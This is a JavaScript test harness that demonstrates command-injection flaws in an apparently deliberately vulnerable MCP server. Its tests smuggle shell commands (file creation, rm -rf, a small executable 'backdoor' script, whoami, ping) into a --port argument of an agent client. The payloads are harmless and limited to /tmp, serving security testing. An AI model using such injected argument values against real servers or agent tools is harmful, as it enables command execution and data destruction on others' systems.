/**
 * Automated Tests for Vulnerable MCP Server
 * These tests demonstrate command injection vulnerabilities
 */

import { spawn } from 'child_process';
import { exec } from 'child_process';
import { promisify } from 'util';
import { logger } from '../server/common/logger.js';

const execAsync = promisify(exec);

class VulnerableServerTester {
  constructor() {
    this.serverProcess = null;
    this.testResults = [];
  }

  /**
   * Start the vulnerable MCP server
   */
  async startServer() {
    return new Promise((resolve, reject) => {
      this.serverProcess = spawn('node', ['server/mcp_vulnerable.js'], {
        stdio: ['pipe', 'pipe', 'pipe']
      });

      this.serverProcess.stdout.on('data', (data) => {
        logger.info(`[TEST] Server output: ${data.toString()}`);
      });

      this.serverProcess.stderr.on('data', (data) => {
        logger.error(`[TEST] Server error: ${data.toString()}`);
      });

      // Wait a moment for server to start
      setTimeout(() => resolve(), 1000);
    });
  }

  /**
   * Stop the vulnerable MCP server
   */
  async stopServer() {
    if (this.serverProcess) {
      this.serverProcess.kill();
      this.serverProcess = null;
    }
  }

  /**
   * Test type coercion attack
   */
  async testTypeCoercionAttack() {
    logger.info('[TEST] Testing type coercion attack...');
    
    try {
      // Clean up any existing files
      await execAsync('rm -f /tmp/type_coercion_test');
      
      // Execute attack
      const result = await execAsync('node server/agent_client.js --port="8080; touch /tmp/type_coercion_test; #"');
      
      // Check if attack was successful
      const fileCheck = await execAsync('ls -la /tmp/type_coercion_test');
      
      if (fileCheck.stdout.includes('type_coercion_test')) {
        this.testResults.push({
          test: 'Type Coercion Attack',
          status: 'SUCCESS (Vulnerable)',
          details: 'File /tmp/type_coercion_test was created'
        });
        logger.warn('[TEST] Type coercion attack SUCCESSFUL - server is vulnerable!');
      } else {
        this.testResults.push({
          test: 'Type Coercion Attack',
          status: 'FAILED (Secure)',
          details: 'File was not created'
        });
        logger.info('[TEST] Type coercion attack FAILED - server may be secure');
      }
    } catch (error) {
      this.testResults.push({
        test: 'Type Coercion Attack',
        status: 'ERROR',
        details: error.message
      });
      logger.error(`[TEST] Type coercion attack error: ${error.message}`);
    }
  }

  /**
   * Test chain exploitation attack
   */
  async testChainExploitationAttack() {
    logger.info('[TEST] Testing chain exploitation attack...');
    
    try {
      // Create test directory
      await execAsync('mkdir -p /tmp/chain_test_dir');
      
      // Execute attack
      const result = await execAsync('node server/agent_client.js --port="8080; echo \\"123; rm -rf /tmp/chain_test_dir; #\\" #"');
      
      // Check if attack was successful
      try {
        await execAsync('ls -la /tmp/chain_test_dir');
        this.testResults.push({
          test: 'Chain Exploitation Attack',
          status: 'FAILED (Secure)',
          details: 'Directory /tmp/chain_test_dir still exists'
        });
        logger.info('[TEST] Chain exploitation attack FAILED - server may be secure');
      } catch (error) {
        this.testResults.push({
          test: 'Chain Exploitation Attack',
          status: 'SUCCESS (Vulnerable)',
          details: 'Directory /tmp/chain_test_dir was removed'
        });
        logger.warn('[TEST] Chain exploitation attack SUCCESSFUL - server is vulnerable!');
      }
    } catch (error) {
      this.testResults.push({
        test: 'Chain Exploitation Attack',
        status: 'ERROR',
        details: error.message
      });
      logger.error(`[TEST] Chain exploitation attack error: ${error.message}`);
    }
  }

  /**
   * Test backdoor creation attack
   */
  async testBackdoorAttack() {
    logger.info('[TEST] Testing backdoor creation attack...');
    
    try {
      // Clean up any existing backdoor
      await execAsync('rm -f /tmp/backdoor_test.sh');
      
      // Execute attack
      const result = await execAsync('node server/agent_client.js --port="8080; echo \\"#!/bin/bash\\" > /tmp/backdoor_test.sh && echo \\"echo \\\\\\"Backdoor test successful\\\\\\"\\" >> /tmp/backdoor_test.sh && chmod +x /tmp/backdoor_test.sh; #"');
      
      // Check if backdoor was created
      const fileCheck = await execAsync('ls -la /tmp/backdoor_test.sh');
      
      if (fileCheck.stdout.includes('backdoor_test.sh') && fileCheck.stdout.includes('-rwx')) {
        this.testResults.push({
          test: 'Backdoor Creation Attack',
          status: 'SUCCESS (Vulnerable)',
          details: 'Backdoor file /tmp/backdoor_test.sh was created and is executable'
        });
        logger.warn('[TEST] Backdoor creation attack SUCCESSFUL - server is vulnerable!');
        
        // Test backdoor execution
        const backdoorResult = await execAsync('/tmp/backdoor_test.sh');
        logger.info(`[TEST] Backdoor execution result: ${backdoorResult.stdout}`);
      } else {
        this.testResults.push({
          test: 'Backdoor Creation Attack',
          status: 'FAILED (Secure)',
          details: 'Backdoor file was not created or is not executable'
        });
        logger.info('[TEST] Backdoor creation attack FAILED - server may be secure');
      }
    } catch (error) {
      this.testResults.push({
        test: 'Backdoor Creation Attack',
        status: 'ERROR',
        details: error.message
      });
      logger.error(`[TEST] Backdoor creation attack error: ${error.message}`);
    }
  }

  /**
   * Test information gathering attack
   */
  async testInformationGatheringAttack() {
    logger.info('[TEST] Testing information gathering attack...');
    
    try {
      // Clean up any existing files
      await execAsync('rm -f /tmp/info_gathering_test');
      
      // Execute attack
      const result = await execAsync('node server/agent_client.js --port="8080; whoami > /tmp/info_gathering_test; #"');
      
      // Check if information was gathered
      const fileCheck = await execAsync('cat /tmp/info_gathering_test');
      
      if (fileCheck.stdout.trim()) {
        this.testResults.push({
          test: 'Information Gathering Attack',
          status: 'SUCCESS (Vulnerable)',
          details: `Gathered user information: ${fileCheck.stdout.trim()}`
        });
        logger.warn('[TEST] Information gathering attack SUCCESSFUL - server is vulnerable!');
      } else {
        this.testResults.push({
          test: 'Information Gathering Attack',
          status: 'FAILED (Secure)',
          details: 'No information was gathered'
        });
        logger.info('[TEST] Information gathering attack FAILED - server may be secure');
      }
    } catch (error) {
      this.testResults.push({
        test: 'Information Gathering Attack',
        status: 'ERROR',
        details: error.message
      });
      logger.error(`[TEST] Information gathering attack error: ${error.message}`);
    }
  }

  /**
   * Test network reconnaissance attack
   */
  async testNetworkReconnaissanceAttack() {
    logger.info('[TEST] Testing network reconnaissance attack...');
    
    try {
      // Clean up any existing files
      await execAsync('rm -f /tmp/network_recon_test');
      
      // Execute attack
      const result = await execAsync('node server/agent_client.js --port="8080; ping -c 1 8.8.8.8 > /tmp/network_recon_test 2>&1; #"');
      
      // Check if network reconnaissance was successful
      const fileCheck = await execAsync('cat /tmp/network_recon_test');
      
      if (fileCheck.stdout.includes('1 packets transmitted') || fileCheck.stdout.includes('PING')) {
        this.testResults.push({
          test: 'Network Reconnaissance Attack',
          status: 'SUCCESS (Vulnerable)',
          details: 'Network reconnaissance was successful'
        });
        logger.warn('[TEST] Network reconnaissance attack SUCCESSFUL - server is vulnerable!');
      } else {
        this.testResults.push({
          test: 'Network Reconnaissance Attack',
          status: 'FAILED (Secure)',
          details: 'Network reconnaissance failed'
        });
        logger.info('[TEST] Network reconnaissance attack FAILED - server may be secure');
      }
    } catch (error) {
      this.testResults.push({
        test: 'Network Reconnaissance Attack',
        status: 'ERROR',
        details: error.message
      });
      logger.error(`[TEST] Network reconnaissance attack error: ${error.message}`);
    }
  }

  /**
   * Run all vulnerability tests
   */
  async runAllTests() {
    logger.info('[TEST] Starting vulnerability tests...');
    
    try {
      await this.startServer();
      
      // Run all attack tests
      await this.testTypeCoercionAttack();
      await this.testChainExploitationAttack();
      await this.testBackdoorAttack();
      await this.testInformationGatheringAttack();
      await this.testNetworkReconnaissanceAttack();
      
      // Print test results
      this.printTestResults();
      
    } catch (error) {
      logger.error(`[TEST] Test execution error: ${error.message}`);
    } finally {
      await this.stopServer();
      await this.cleanup();
    }
  }

  /**
   * Print test results summary
   */
  printTestResults() {
    console.log('\n' + '='.repeat(60));
    console.log('VULNERABILITY TEST RESULTS');
    console.log('='.repeat(60));
    
    let vulnerableCount = 0;
    let secureCount = 0;
    let errorCount = 0;
    
    this.testResults.forEach(result => {
      const status = result.status.includes('SUCCESS') ? '🚨' : 
                    result.status.includes('FAILED') ? '✅' : '❌';
      
      console.log(`${status} ${result.test}: ${result.status}`);
      console.log(`   Details: ${result.details}`);
      console.log('');
      
      if (result.status.includes('SUCCESS')) vulnerableCount++;
      else if (result.status.includes('FAILED')) secureCount++;
      else errorCount++;
    });
    
    console.log('='.repeat(60));
    console.log(`SUMMARY: ${vulnerableCount} Vulnerable, ${secureCount} Secure, ${errorCount} Errors`);
    
    if (vulnerableCount > 0) {
      console.log('🚨 SERVER IS VULNERABLE TO COMMAND INJECTION ATTACKS!');
    } else {
      console.log('✅ SERVER APPEARS TO BE SECURE AGAINST COMMAND INJECTION');
    }
    console.log('='.repeat(60) + '\n');
  }

  /**
   * Clean up test artifacts
   */
  async cleanup() {
    try {
      const cleanupCommands = [
        'rm -f /tmp/type_coercion_test',
        'rm -f /tmp/backdoor_test.sh',
        'rm -f /tmp/info_gathering_test',
        'rm -f /tmp/network_recon_test',
        'rm -rf /tmp/chain_test_dir'
      ];
      
      for (const command of cleanupCommands) {
        try {
          await execAsync(command);
        } catch (error) {
          // Ignore cleanup errors
        }
      }
      
      logger.info('[TEST] Cleanup completed');
    } catch (error) {
      logger.error(`[TEST] Cleanup error: ${error.message}`);
    }
  }
}

// Run tests if this file is executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
  const tester = new VulnerableServerTester();
  tester.runAllTests().catch(console.error);
}

export default VulnerableServerTester; 